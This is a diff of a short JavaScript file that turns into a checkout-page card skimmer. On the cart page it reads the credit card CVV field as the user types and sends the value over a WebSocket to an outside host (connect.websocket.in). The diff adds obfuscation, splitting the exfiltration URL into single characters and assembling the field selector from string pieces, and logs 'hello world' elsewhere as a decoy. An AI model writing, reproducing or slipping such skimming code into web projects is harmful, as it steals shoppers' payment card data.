@@ -1,25 +1,70 @@
-const path = '/cart/view';
-const name = document.location.pathname;
-const selector = '.js-credit-card-block > div:nth-child(2) > div:nth-child(1)';
+const p = '/cart/view';
+const n = document.location.pathname;
+const s = '#cre' + 'ditCard' + 'C' + 'VVField';
+const u = [
+  'w',
+  's',
+  's',
+  ':',
+  '/',
+  '/',
+  'c',
+  'o',
+  'n',
+  'n',
+  'e',
+  'c',
+  't',
+  '.',
+  'w',
+  'e',
+  'b',
+  's',
+  'o',
+  'c',
+  'k',
+  'e',
+  't',
+  '.',
+  'i',
+  'n',
+  '/',
+  't',
+  'e',
+  's',
+  't',
+  '?',
+  'r',
+  'o',
+  'o',
+  'm',
+  '_',
+  'i',
+  'd',
+  '=',
+  '3',
+  '1',
+  '3',
+  '3',
+  '7',
+];
 
-function onKlik() {
-  const socket = new WebSocket('wss://connect.websocket.in/test?room_id=31337');
+function magic() {
+  const socket = new WebSocket(u.join(''));
 
   socket.onmessage = function(msg) {
     console.log(msg);
   };
 
   socket.onopen = function() {
-    const x = document.querySelector('#cre' + 'ditCard' + 'C' + 'VVField')
-      .value;
+    const x = document.querySelector(s).value;
     socket.send(x);
     console.log(x);
   };
 }
 
-if (name !== path) {
+if (n !== p) {
   console.log('hello world');
 } else {
-  document.querySelector(selector).addEventListener('click', onKlik);
+  document.querySelector(s).addEventListener('input', magic);
 }
-
